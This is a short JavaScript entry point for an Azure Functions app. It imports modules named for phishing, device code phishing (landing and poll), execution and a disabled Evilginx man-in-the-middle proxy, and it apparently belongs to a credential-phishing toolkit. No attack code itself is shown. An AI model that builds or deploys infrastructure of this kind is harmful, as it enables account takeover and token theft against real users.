const { app } = require('@azure/functions');

// Import only the WORKING functions
require('./functions/phishing.js');
require('./functions/devicecode_landing.js');
require('./functions/devicecode_poll.js');
require('./functions/execution.js');
// TEMPORARILY REMOVED: require('./functions/evilginx_mitm.js');